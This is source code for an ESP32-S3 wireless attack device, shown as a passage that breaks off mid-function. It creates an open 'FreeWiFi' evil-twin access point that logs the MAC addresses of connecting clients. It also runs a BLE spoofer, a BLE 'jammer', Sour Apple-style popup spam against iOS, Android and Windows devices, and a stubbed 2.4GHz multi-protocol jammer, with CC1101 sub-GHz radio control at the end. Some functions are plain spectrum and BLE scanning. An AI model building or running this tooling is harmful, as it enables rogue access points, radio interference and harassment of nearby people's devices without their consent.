ipv4shh/ESPTOOL2/ESP32_S3/ESP32_S3_ATTACK/ESP32_S3_ATTACK.ino
void startEvilTwin() {
  Serial.println("Evil Twin started");
  WiFi.softAP("FreeWiFi", NULL, 1, 0, 1);
  sendLogToMaster("[EvilTwin] Created fake AP 'FreeWiFi' (ch 1)");
}

void runEvilTwinStep() {
  static unsigned long lastCheckTime = 0;
  if (millis() - lastCheckTime >= 2000) {
    lastCheckTime = millis();
    int numStations = WiFi.softAPgetStationNum();
    if (numStations != lastStationCount) {
      lastStationCount = numStations;
      char buf[64];
      snprintf(buf, sizeof(buf), "[EvilTwin] Total clients connected: %d", numStations);
      sendLogToMaster(buf);
      
      wifi_sta_list_t wifi_sta_list;
      memset(&wifi_sta_list, 0, sizeof(wifi_sta_list));
      esp_wifi_ap_get_sta_list(&wifi_sta_list);
      
      for (int i = 0; i < wifi_sta_list.num; i++) {
        wifi_sta_info_t station = wifi_sta_list.sta[i];
        char macStr[20];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 station.mac[0], station.mac[1], station.mac[2],
                 station.mac[3], station.mac[4], station.mac[5]);
        
        char structBuf[64];
        snprintf(structBuf, sizeof(structBuf), "[EVIL_CLIENT]%s", macStr);
        sendLogToMaster(structBuf);
        delay(20);
      }
    }
  }
}

void startBLEScan() {
  sendLogToMaster("[BLE] Starting BLE scan...");
  BLEScan *pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  BLEScanResults *foundDevices = pBLEScan->start(5, false);
  if (!foundDevices) {
    sendLogToMaster("[BLE] Scan failed!");
    return;
  }
  
  char buf[64];
  snprintf(buf, sizeof(buf), "[BLE] Found BLE devices: %d", foundDevices->getCount());
  sendLogToMaster(buf);
  
  for (int i = 0; i < min((int)foundDevices->getCount(), 15); i++) {
    yield();
    BLEAdvertisedDevice device = foundDevices->getDevice(i);
    String devName = device.haveName() ? device.getName().c_str() : "Unnamed";
    String devAddr = device.getAddress().toString().c_str();
    
    snprintf(buf, sizeof(buf), "  -> %s [%s] (%d RSSI)", devName.c_str(), devAddr.c_str(), device.getRSSI());
    sendLogToMaster(buf);
    
    char structBuf[128];
    snprintf(structBuf, sizeof(structBuf), "[BLE_DEV]%s|%s|%d", devName.c_str(), devAddr.c_str(), device.getRSSI());
    sendLogToMaster(structBuf);
    delay(50);
  }
  pBLEScan->clearResults();
  delete foundDevices;
}

void startBLESpoofer() {
  Serial.println("BLE Spoofer started");
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData advertisementData;
  advertisementData.setName("BLE_Spoofer");
  advertisementData.setFlags(0x06);

  uint8_t manufData[] = {0x4C, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05};
  String manufString = "";
  for (int i = 0; i < sizeof(manufData); i++) {
    manufString += (char)manufData[i];
  }
  advertisementData.setManufacturerData(manufString);

  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  sendLogToMaster("[BLE] Spoofer running (visible as BLE_Spoofer)");
}

void runBLEJammerStep() {
  if (!bleJammerInitialized) {
    Serial.println("BLE Jammer started");
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData data;
    data.setName("JAMMER");
    data.setFlags(0x06);
    pAdvertising->setAdvertisementData(data);
    pAdvertising->start();
    bleJammerInitialized = true;
    sendLogToMaster("[BLE Jammer] Broadcasting continuous noise");
  }
  delay(10);
}

void runSourAppleStep(bool boost) {
  if (!sourAppleInitialized) {
    Serial.println("BLE Spam started");
    sourAppleInitialized = true;
    lastAppleSpamTime = 0;
    sendLogToMaster("[BLE Spam] Starting popup spam (iOS, Android, Windows)");
  }

  unsigned long interval = boost ? 40 : 100;
  if (millis() - lastAppleSpamTime >= interval) {
    lastAppleSpamTime = millis();
    
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    if (pAdvertising) {
      pAdvertising->stop();
    }

    BLEAdvertisementData advData;
    advData.setFlags(0x04);

    const uint8_t *payload = blePayloads[blePayloadIndex];
    uint8_t len = payload[0];
    std::string manufDataStr((char*)&payload[1], len);
    advData.setManufacturerData(manufDataStr);

    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    
    if (random(20) == 0) {
      char buf[64];
      snprintf(buf, sizeof(buf), "[BLE Spam] Spammed payload %d%s", blePayloadIndex, boost ? " [BOOST]" : "");
      sendLogToMaster(buf);
    }
    
    blePayloadIndex = (blePayloadIndex + 1) % numBlePayloads;
  }
}

// ===== MODULE STUBS =====
void startGhzScan() {
  sendLogToMaster("[2.4GHz Scanner] Scanning Wi-Fi & BLE channels...");
  
  // 1. Scan WiFi networks
  int n = WiFi.scanNetworks(false, true, false, 100);
  int channelCount[14] = {0};
  int channelRssiSum[14] = {0};
  
  if (n == WIFI_SCAN_FAILED) {
    sendLogToMaster("[2.4GHz Scanner] WiFi scan failed!");
  } else if (n > 0) {
    for (int i = 0; i < n; i++) {
      yield();
      int ch = WiFi.channel(i);
      if (ch >= 1 && ch <= 13) {
        channelCount[ch]++;
        channelRssiSum[ch] += WiFi.RSSI(i);
      }
    }
  }
  WiFi.scanDelete();

  // 2. Scan BLE devices
  BLEScan *pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(false);
  pBLEScan->setInterval(80);
  pBLEScan->setWindow(50);
  BLEScanResults *foundDevices = pBLEScan->start(2, false);
  int bleCount = foundDevices ? foundDevices->getCount() : 0;
  pBLEScan->clearResults();
  
  // 3. Compile report
  sendLogToMaster("--- 2.4GHz Band Spectrum Report ---");
  char buf[128];
  int totalAPs = 0;
  for (int ch = 1; ch <= 13; ch++) {
    int aps = channelCount[ch];
    totalAPs += aps;
    if (aps > 0) {
      int avgRssi = channelRssiSum[ch] / aps;
      snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: %d APs (Avg RSSI: %d dBm) %s", 
               ch, aps, avgRssi, 
               avgRssi > -60 ? "[HIGH CONGESTION]" : (avgRssi > -80 ? "[MODERATE]" : "[CLEAN]"));
    } else {
      snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: 0 APs [FREE]", ch);
    }
    sendLogToMaster(buf);
    delay(50);
  }
  snprintf(buf, sizeof(buf), "[Summary] Found %d Wi-Fi APs, %d BLE devices nearby.", totalAPs, bleCount);
  sendLogToMaster(buf);
  sendLogToMaster("[2.4GHz Scanner] Scan finished.");
}

void startProtokill() {
  sendLogToMaster("[Protokill] Starting 2.4GHz multi-protocol jammer using internal radio...");
  currentAttack = "powerful_jammer";
}

void writeReg(uint8_t reg, uint8_t val) {
  digitalWrite(CC1101_CS, LOW);
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  SPI.transfer(reg);
  SPI.transfer(val);
  SPI.endTransaction();
  digitalWrite(CC1101_CS, HIGH);
}

uint8_t readReg(uint8_t reg) {
  digitalWrite(CC1101_CS, LOW);
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  SPI.transfer(reg | 0x80);
  uint8_t val = SPI.transfer(0);
  SPI.endTransaction();
  digitalWrite(CC1101_CS, HIGH);
  return val;
}

bool checkCC1101() {
  pinMode(CC1101_CS, OUTPUT);
  digitalWrite(CC1101_CS, HIGH);
  
  uint8_t ver = readReg(0x31);
  return (ver != 0x00 && ver != 0xFF);
}

void setCC1101_Frequency(float freq) {
  uint32_t freq_reg = (uint32_t)((freq * 65536.0) / 26.0);
  uint8_t freq2 = (freq_reg >> 16) & 0xFF;
  uint8_t freq1 = (freq_reg >> 8) & 0xFF;
  uint8_t freq0 = freq_reg & 0xFF;
  
  writeReg(0x0D, freq2);
  writeReg(0x0E, freq1);
  writeReg(0x0F, freq0);
  
